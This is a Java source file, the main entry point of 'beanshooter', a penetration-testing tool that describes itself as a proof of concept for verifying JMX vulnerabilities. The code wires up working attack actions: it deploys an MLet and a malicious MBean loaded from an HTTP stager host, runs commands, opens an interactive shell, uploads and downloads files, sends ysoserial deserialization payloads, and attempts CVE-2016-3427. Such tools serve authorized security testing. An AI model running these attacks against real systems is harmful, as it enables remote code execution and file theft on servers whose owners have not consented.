package de.qtc.beanshooter;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.List;
import java.util.Properties;
import java.util.Scanner;

import javax.management.MalformedObjectNameException;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.utils.RealmHandler;


public class Beanshooter {

    private static String defaultConfiguration = "/config.properties";

    public static void main(String[] argv) {

        Options options = new Options();

        Option stagerHost = new Option(null, "stager-host", true, "IP address of the .jar providing host");
        stagerHost.setRequired(false);
        options.addOption(stagerHost);

        Option stagerPort = new Option(null, "stager-port", true, "HTTP port of the .jar providing host");
        stagerPort.setRequired(false);
        options.addOption(stagerPort);

        Option stagerOnly = new Option(null, "stager-only", false, "Only start a HTTP payload server");
        stagerOnly.setRequired(false);
        options.addOption(stagerOnly);

        Option remoteStager = new Option(null, "remote-stager", false, "do not create a local HTTP listener");
        remoteStager.setRequired(false);
        options.addOption(remoteStager);

        Option bindAddress = new Option(null, "bind-address", true, "IP address to bind the stager server");
        bindAddress.setRequired(false);
        options.addOption(bindAddress);

        Option bindPort = new Option(null, "bind-port", true, "port of the stager server");
        bindPort.setRequired(false);
        options.addOption(bindPort);

        Option jmxmp = new Option(null, "jmxmp", false, "use the JMXMP protocol instead of Java RMI");
        jmxmp.setRequired(false);
        options.addOption(jmxmp);

        Option ysoserial = new Option(null, "yso", true, "location of the ysoserial.jar file");
        ysoserial.setRequired(false);
        options.addOption(ysoserial);

        Option configOption = new Option(null, "config", true, "path to a configuration file");
        configOption.setRequired(false);
        options.addOption(configOption);

        Option boundName = new Option(null, "bound-name", true, "bound name of the jmx-rmi endpoint");
        boundName.setRequired(false);
        options.addOption(boundName);

        Option username = new Option(null, "username", true, "username for JMX authentication");
        username.setRequired(false);
        options.addOption(username);

        Option password = new Option(null, "password", true, "password for JMX authentication");
        password.setRequired(false);
        options.addOption(password);

        Option ssl = new Option(null, "ssl", false, "use ssl for the RMI registry connection");
        ssl.setRequired(false);
        options.addOption(ssl);

        Option noColor = new Option(null, "no-color", false, "disable colored output");
        noColor.setRequired(false);
        options.addOption(noColor);

        Option follow = new Option(null, "follow", false, "follow redirections to other targets");
        follow.setRequired(false);
        options.addOption(follow);

        Option sasl = new Option(null, "sasl", true, "SASL authentication mechanism for JMXMP");
        sasl.setRequired(false);
        options.addOption(sasl);

        Option help = new Option(null, "help", false, "display help");
        help.setRequired(false);
        options.addOption(help);

        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine commandLine = null;

        String helpString = "beanshooter [options] <ip> <port> <action>\n"
                           +"Proof of concept tool to verify vulnerabilities in JMX installations.\n\n"
                           +"Positional Arguments:\n"
                           +"    ip:                  IP address of your target\n"
                           +"    port:                Port where JMX agent is listening\n"
                           +"    action:              One of the possible actions listed below\n\n"
                           +"Possible Actions:\n"
                           +"    ping                          Check if MBean is working\n"
                           +"    status                        Check if MLet or MBean are already deployed\n"
                           +"    deployAll                     Deploy MLet and MBean\n"
                           +"    deployMLet                    Only deploy MLet\n"
                           +"    deployMBean                   Only deploy MBean\n"
                           +"    undeployAll                   Undeploy MLet and MBean\n"
                           +"    undeployMLet                  Only undeploy MLet\n"
                           +"    undeployMBean                 Only undeploy MBean\n"
                           +"    shell                         Continuously prompt for new commands\n"
                           +"    execute <cmd>                 Execute specified command\n"
                           +"    executeBackground <cmd>       Execute command in the background\n"
                           +"    upload <src> <dest>           Upload a local file to the server\n"
                           +"    download <src> <dest>         Download a file form the server\n"
                           +"    ysoserial <gadget> <cmd>      Pass ysoserial payload to getLoggerLevel\n"
                           +"    cve-2016-3427 <gadget> <cmd>  Attempt cve-2016-3427\n\n"

                           +"Optional Arguments:";

        try {
            commandLine = parser.parse(options, argv);
        } catch (ParseException e) {
            Logger.printlnPlain_ye("Error: " + e.getMessage() + "\n");
            formatter.printHelp(helpString, options);
            System.exit(1);
        }

        if( commandLine.hasOption("help") ) {
            formatter.printHelp(helpString, options);
            System.exit(0);
        }

        /* The default configuration values are loaded from the default configuration file inside the .jar */
        Properties config = new Properties();
        Beanshooter.loadConfig(defaultConfiguration, config, false);

        /* If an additional configuration file is specified on the command line, we overwrite specified properties */
        String additionalConfig = commandLine.getOptionValue("config", null);
        if( additionalConfig != null )
            Beanshooter.loadConfig(additionalConfig, config, true);

        boolean useSsl = commandLine.hasOption("ssl");
        boolean jmxmpValue = commandLine.hasOption("jmxmp");
        boolean followRedirect = commandLine.hasOption("follow");
        boolean stagerOnlyValue = commandLine.hasOption("stager-only");
        boolean remoteStagerValue = commandLine.hasOption("remote-stager");
        boolean noColorValue = commandLine.hasOption("no-color");

        String saslValue = commandLine.getOptionValue("sasl", null);
        String ysoValue = commandLine.getOptionValue("yso", config.getProperty("ysoserial"));
        String userNameValue = commandLine.getOptionValue("username", config.getProperty("username"));
        String passwordValue = commandLine.getOptionValue("password", config.getProperty("password"));
        String boundNameValue = commandLine.getOptionValue("bound-name", config.getProperty("boundName"));
        String stagerPortValue = commandLine.getOptionValue("stager-port", config.getProperty("stagerPort"));
        String stagerHostValue = commandLine.getOptionValue("stager-host", config.getProperty("stagerHost"));
        String bindAddressValue = commandLine.getOptionValue("bind-address", config.getProperty("bindAddress"));
        String bindPortValue = commandLine.getOptionValue("bind-port", config.getProperty("bind-port"));

        String jarPath = config.getProperty("jarPath");
        String jarName = config.getProperty("jarName");
        String beanClass = config.getProperty("beanClass");
        String objectName = config.getProperty("objectName");
        String mLetNameString = config.getProperty("mLetName");

        if( bindPortValue == null )
            bindPortValue = stagerPortValue;
        if( bindAddressValue == null )
            bindAddressValue = stagerHostValue;
        if( noColorValue )
            Logger.disableColor();

        GreenGrocer gg = null;
        try {
            gg = new GreenGrocer(jarPath, jarName, beanClass, objectName, mLetNameString);
        } catch( MalformedObjectNameException e ) {
            Logger.eprintln_ye("Object name '" + objectName + "' seems to be invalid.");
            System.exit(1);
        }

        if( stagerOnlyValue ) {
            gg.startStagerServer(bindAddressValue, bindPortValue, stagerHostValue, stagerPortValue);
            Scanner dummyScanner = new Scanner(System.in);
            Logger.print_bl("Press Enter to stop listening...");
            dummyScanner.nextLine();
            dummyScanner.close();
            System.exit(0);
        }

        /* At this point <IP> <PORT> and <ACTION> should be present on the command line */
        List<String> remainingArgs = commandLine.getArgList();
        if( remainingArgs.size() < 3 ) {
            Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
            formatter.printHelp(helpString, options);
            System.exit(1);
        }

        String remoteHost = remainingArgs.get(0);
        String remotePort = remainingArgs.get(1);
        String action = remainingArgs.get(2);

        int argCount = remainingArgs.size();
        String gadget = "";
        String srcFile = "";
        String destFile = "";
        String command = "id";
        Object ysoPayload = null;

        switch(action) {

            case "execute":
            case "executeBackground":
                if( argCount > 3 ) {
                    command = remainingArgs.get(3);
                }
                break;

            case "ysoserial":
            case "cve-2016-3427":
                if( argCount < 5 ) {
                    Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
                    formatter.printHelp(helpString, options);
                    System.exit(1);
                }

                gadget = remainingArgs.get(3);
                command = remainingArgs.get(4);
                ysoPayload = getPayloadObject(ysoValue, gadget, command);
                break;

            case "download":
                if( argCount < 4 ) {
                    Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
                    formatter.printHelp(helpString, options);
                    System.exit(1);
                }

                srcFile = remainingArgs.get(3);
                if( argCount > 5 )
                    destFile = remainingArgs.get(4);

            case "upload":
                if( argCount < 5 ) {
                    Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
                    formatter.printHelp(helpString, options);
                    System.exit(1);
                }

                srcFile = remainingArgs.get(3);
                destFile = remainingArgs.get(4);
        }

        int remotePortNumeric = 1090;
        try {
            remotePortNumeric = Integer.valueOf(remotePort);
        } catch( Exception e ) {
            Logger.eprintlnPlain_ye("Error - Remote port has to be a numeric value.\n");
            formatter.printHelp(helpString, options);
            System.exit(1);
        }

        String saslMechanism = null;
        if( saslValue != null ) {
            saslMechanism = getSaslMechanism(saslValue, useSsl);
            if( saslMechanism == null ) {
                Logger.eprintln_ye("Specified SASL mechanism '" + saslValue + "' is invalid.");
                Logger.println_bl("Possible values are:");
                Logger.increaseIndent();
                Logger.println_bl("* NTLM");
                Logger.println_bl("* PLAIN");
                Logger.println_bl("* GSSAPI");
                Logger.println_bl("* CRAM-MD5");
                Logger.println_bl("* DIGEST-MD5");
                System.exit(1);
            }
        }

        Object credentials = null;
        if( (userNameValue != null || passwordValue != null) && (!userNameValue.isEmpty() || !passwordValue.isEmpty()) ) {
            credentials = new String[] {userNameValue, passwordValue};
            RealmHandler.username = userNameValue;
            RealmHandler.password = passwordValue;
        }

        if( action.equals("cve-2016-3427") ) {

            if( jmxmpValue ) {
                Logger.eprintln_ye("Action 'cve-2016-3427' is incompatible with '--jmxmp' option.");
                System.exit(1);
            }

            Logger.println_bl("cve-2016-3427 - Sending serialized Object as credential.");
            Logger.increaseIndent();
            Logger.println_bl("An SecurityException during the connection attempt is expected.");
            Logger.decreaseIndent();
            credentials = ysoPayload;
        }

        gg.connect(remoteHost, remotePortNumeric, boundNameValue, credentials, jmxmpValue, useSsl, followRedirect, saslMechanism);

        switch( action ) {
            case "status":
                gg.jmxStatus();
                break;
            case "deployAll":
                gg.registerMLet();
                Logger.println("");
                gg.registerBean(bindAddressValue, bindPortValue, stagerHostValue, stagerPortValue, remoteStagerValue);
                break;
            case "deployMLet":
                gg.registerMLet();
                break;
            case "deployMBean":
                gg.registerBean(bindAddressValue, bindPortValue, stagerHostValue, stagerPortValue, remoteStagerValue);
                break;
            case "undeployAll":
                gg.unregisterBean();
                gg.unregisterMLet();
                break;
            case "undeployMBean":
                gg.unregisterBean();
                break;
            case "undeployMLet":
                gg.unregisterMLet();
                break;
            case "ping":
                gg.ping();
                break;
            case "shell":
                gg.startShell();
                break;
            case "execute":
                gg.executeCommand(command, true);
                break;
            case "executeBackground":
                gg.executeCommandBackground(command, true);
                break;
            case "upload":
                gg.uploadFile(srcFile, destFile);
                break;
            case "download":
                gg.downloadFile(srcFile, destFile);
                break;
            case "ysoserial":
                gg.getLoggerLevel(ysoPayload);
                break;
            case "cve-2016-3427":
                Logger.println_bl("Encountered no Exception during cve-2016-3427 attempt.");
                Logger.increaseIndent();
                Logger.println_bl("Does the target require authentication?");
                Logger.println_bl("If vulnerable, the payload works anyway.");
                break;
            default:
                Logger.eprint("Unkown action: ");
                Logger.eprintlnPlain_ye(action);
                break;
        }
        gg.disconnect();
    }

    private static void loadConfig(String filename, Properties prop, boolean extern) {

        InputStream configStream = null;
        try {
            if( extern ) {
                configStream = new FileInputStream(filename);
            } else {
                configStream = Beanshooter.class.getResourceAsStream(filename);
            }

        prop.load(configStream);
        configStream.close();

        } catch( IOException e ) {
            Logger.println_ye("Unable to load properties file '" + filename + "'");
            System.exit(1);
        }

    }

    private static String getSaslMechanism(String choice, boolean tls) {

        String mechanism;

        switch(choice) {
            case "CRAM-MD5":
                mechanism = tls ? "TLS SASL/CRAM-MD5" : "SASL/CRAM-MD5";
                break;
            case "DIGEST-MD5":
                mechanism = tls ? "TLS SASL/DIGEST-MD5" : "SASL/DIGEST-MD5";
                break;
            case "GSSAPI":
                mechanism = tls ? "TLS SASL/GSSAPI" : "SASL/GSSAPI";
                break;
            case "PLAIN":
                mechanism = tls ? "TLS SASL/PLAIN" : "SASL/PLAIN";
                break;
            case "NTLM":
                mechanism = tls ? "TLS SASL/NTLM" : "SASL/NTLM";
                break;
            default:
                mechanism = null;
                break;
        }

        return mechanism;
    }

    private static Object getPayloadObject(String ysoPath, String gadget, String command) {

        Object ysoPayload = null;
        File ysoJar = new File(ysoPath);

        if( !ysoJar.exists() ) {
            Logger.println_ye("Error: '" + ysoJar.getAbsolutePath() + "' does not exist.");
            System.exit(1);
        }

        Logger.print("Creating ysoserial payload...");

        try {
            URLClassLoader ucl = new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            ysoPayload = method.invoke(null, new Object[] {gadget, command});

        } catch (MalformedURLException | ClassNotFoundException | NoSuchMethodException | SecurityException |
                IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {

            Throwable ex = e;
            if( e instanceof InvocationTargetException )
                ex = e.getCause();

            Logger.eprint("Error: Unable to create ysoserial gadget ");
            Logger.eprintlnPlain_ye(gadget);
            Logger.eprint("Error message is: ");
            Logger.eprintlnPlain_ye(ex.getMessage());
            Logger.eprintln("StackTrace:");
            ex.printStackTrace();
            System.exit(1);
        }

        Logger.printlnPlain("done.");
        return ysoPayload;
    }
}
